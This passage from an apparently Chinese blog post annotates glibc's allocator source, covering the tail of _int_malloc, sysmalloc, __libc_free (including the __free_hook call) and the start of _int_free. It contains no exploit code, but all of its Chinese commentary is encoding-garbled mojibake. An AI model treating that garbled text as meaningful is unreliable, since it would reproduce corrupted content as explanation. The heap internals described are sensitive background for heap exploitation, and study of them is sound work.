&amp;main_arena)</span><br><span class="line">               set_non_main_arena (victim);</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="comment">/* Split */</span></span><br><span class="line">         <span class="comment">//å¦åˆ™ï¼Œå°†remainer åŠ å…¥ unsorted binä¸­</span></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                have to perform a complete insert here.  */</span></span><br><span class="line">             bck = unsorted_chunks (av);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">             <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">               malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">             remainder-&gt;bk = bck;</span><br><span class="line">             remainder-&gt;fd = fwd;</span><br><span class="line">             bck-&gt;fd = remainder;</span><br><span class="line">             fwd-&gt;bk = remainder;</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line">           &#125;</span><br><span class="line">         check_malloced_chunk (av, victim, nb);</span><br><span class="line">         <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         <span class="keyword">return</span> p;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ10ï¼‰æ¥ä¸‹æ¥ï¼Œè¿›å…¥å†…å±‚ç¬¬äºŒä¸ª for å¾ªç¯ï¼Œæ ¹æ® binmap æ¥æœç´¢ bin ï¼Œå› ä¸ºç”³è¯·çš„ chunk å¤§å°æ‰€å¯¹åº” bin æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ chunk ï¼Œæ‰€ä»¥ï¼Œå°±è¦ä»ä¸‹ä¸€ä¸ª bin å¼€å§‹æœç´¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">   bin = bin_at (av, idx);</span><br><span class="line">   block = idx2block (idx);</span><br><span class="line">   map = av-&gt;binmap[block];</span><br><span class="line">   bit = idx2bit (idx);</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ11ï¼‰åœ¨å†…å±‚ç¬¬äºŒä¸ªå¾ªç¯å†…éƒ¨ï¼Œå¯»æ‰¾ç¬¬ä¸€ä¸ªä¸ä¸ºç©ºçš„ block ï¼Œå†æ ¹æ®æ¯”ç‰¹ä½æ‰¾åˆ°åˆé€‚çš„ binã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">       &#123;</span><br><span class="line">    <span class="comment">/*binmapæ•°ç»„çš„å…ƒç´ ç±»å‹æ˜¯unsigned intï¼Œ32å’Œ64ä½ä¸€èˆ¬éƒ½æ˜¯4å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯32æ¯”ç‰¹ï¼Œæ‰€ä»¥binmapçš„ä¸€ä¸ªblockèƒ½å¤Ÿæ£€æŸ¥32ä¸ªbin*/</span></span><br><span class="line">         <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">         <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="keyword">do</span></span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span> <span class="comment">//å¦‚æœæˆç«‹ï¼Œè¯´æ˜éå†äº†æ‰€æœ‰çš„binä¸”éƒ½ä¸ºç©ºï¼Œåªæœ‰åŒºtop chunkä¸­å¯»æ‰¾</span></span><br><span class="line">                   <span class="keyword">goto</span> use_top;</span><br><span class="line">               &#125;</span><br><span class="line">       </span><br><span class="line">             <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">             bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">             bit = <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">    <span class="comment">//æ‰¾åˆ°blockä¸ä¸ºç©ºçš„æœ€å°çš„binå¯¹åº”çš„bit</span></span><br><span class="line">         <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">           &#123;</span><br><span class="line">             bin = next_bin (bin);</span><br><span class="line">             bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">             assert (bit != <span class="number">0</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ12ï¼‰ç„¶åæ£€æŸ¥ bit å¯¹åº”çš„ bin æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯ï¼Œå°±æ¸…ç©ºå¯¹åº”çš„ bit ä½ï¼Œä»ä¸‹ä¸€ä¸ª bin å¼€å§‹å¾ªç¯ï¼Œå¦åˆ™å°† Victim ä» bin ä¸­å–å‡ºæ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">         victim = last (bin);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">         <span class="keyword">if</span> (victim == bin)</span><br><span class="line">           &#123;</span><br><span class="line">             av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">             bin = next_bin (bin);</span><br><span class="line">             bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">             assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* unlink */</span></span><br><span class="line">             unlink_chunk (av, victim);</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ13ï¼‰å°†å–å‡ºçš„ victim è¿›è¡Œåˆ‡åˆ†ï¼Œå¹¶æŠŠ remainder åŠ å…¥ unsorted bin ï¼Œå¦‚æœ victim ä¸å¤Ÿåˆ‡åˆ†ï¼Œå°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œå†…å±‚ç¬¬äºŒä¸ªå¾ªç¯åˆ°æ­¤ç»“æŸã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">/* Exhaust */</span></span><br><span class="line">      <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (victim);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Split */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">             have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">              remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ï¼ˆ14ï¼‰å¦‚æœä¸Šé¢çš„æ“ä½œè¿˜ä¸èƒ½æ»¡è¶³è¯·æ±‚ï¼Œå°±åªèƒ½ä» top chunk ä¸Šè¿›è¡Œåˆ‡åˆ†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">   use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">                                                                                                                       </span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ä¸»çº¿ç¨‹ä¸‹ï¼Œsysmalloc () å‡½æ•°çš„å¤§æ¦‚æµç¨‹å¦‚ä¸‹ï¼š</p><p>â€‹ï¼ˆ1ï¼‰å½“ç”³è¯·çš„å¤§å° nb å¤§äº mp_.mmap_threshold æ—¶ï¼Œé€šè¿‡ mmap () å‡½æ•°è¿›è¡Œåˆ†é…ã€‚å…¶ä¸­ mp_.mmap_threshold çš„é»˜è®¤å¤§å°ä¸º 128*1024 å­—èŠ‚ã€‚</p><p>â€‹ï¼ˆ2ï¼‰å°è¯•ç”¨ brk () æ‰©å±•å †å†…å­˜ï¼Œå½¢æˆæ–°çš„ top chunk ï¼Œè€Œä¹…çš„ top chunk ä¼šè¢«é‡Šæ”¾ã€‚ç„¶åä»æ–°çš„ top chunk ä¸­åˆ‡åˆ†å‡º nb å¤§å°çš„ chunk ï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚</p><h2 id="5freeç›¸å…³æºç "><a class="markdownIt-Anchor" href="#5freeç›¸å…³æºç ">#</a> 5.free () ç›¸å…³æºç ï¼š</h2><h3 id="__libc_free"><a class="markdownIt-Anchor" href="#__libc_free">#</a> __libc_free()ï¼š</h3><p>â€‹åŒ malloc () å‡½æ•°ä¸€æ ·ï¼Œfree () å‡½æ•°å®é™…ä¸Šæ˜¯ __libc_free ()ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)) <span class="comment">//hookå‡½æ•°ä¸æ˜¯nullï¼Œå°±æ‰§è¡Œ__free_hookå¯¹åº”çš„å‡½æ•°å¹¶è¿”å›</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem); <span class="comment">//å°†æŒ‡å‘user data çš„æŒ‡é’ˆè½¬åŒ–ä¸ºæŒ‡å‘ chunkçš„æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p)) <span class="comment">//å¦‚æœchunkæ˜¯mmapåˆ†é…çš„ï¼Œå°±ç”¨munmap_chunkï¼ˆï¼‰å‡½æ•°é‡Šæ”¾                /* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p); <span class="comment">//è·å¾—æŒ‡å‘arenaçš„æŒ‡é’ˆ</span></span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>); <span class="comment">//è°ƒç”¨initå‡½æ•°è¿›è¡Œé‡Šæ”¾</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="_int_free"><a class="markdownIt-Anchor" href="#_int_free">#</a> _int_free()ï¼š</h3><p>â€‹å‡½æ•°å¼€å¤´å…ˆå®šä¹‰äº†ä¸€äº›åˆ—æ‰€éœ€çš„å˜é‡ï¼Œå¹¶è·å¾—è¦é‡Šæ”¾çš„ chunk çš„å¤§å°ï¼Œå¹¶å¯¹ chunk åšä¸€äº›æ£€æŸ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ç¬¬ä¸€ä¸ªæ¡ä»¶ç­›é€‰æ‰ä¸€äº›ç‰¹åˆ«å¤§çš„sizeï¼Œç¬¬äºŒä¸ªæ¡ä»¶æ£€æŸ¥chunkæ˜¯å¦å¯¹é½</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">    <span class="comment">//åˆ†åˆ«æ£€æŸ¥sizeæ˜¯å¦è¿‡å°ä»¥åŠsizeæ˜¯å¦å¯¹å…¶</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">//ä»…å½“å®šä¹‰äº†Malloc_Debugæ—¶ä½¿ç”¨</span></span><br></pre></td></tr></table></figure><p>â€‹ç„¶åï¼Œåˆ¤æ–­è¯¥ chunk æ˜¯å¦åœ¨ fast bin èŒƒå›´å†…ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™æ’å…¥ fast bin ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¦‚æœsize å°äºglobal_max_fast,åˆ™å°†å…¶åŠ å…¥fast binä¸­</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="comment">//TRIM_FASTBINSé»˜è®¤ä¸º0ï¼Œä¸ä¼šå°†ä¸Top chunké è¿‘çš„fast binåˆ æ‰</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span 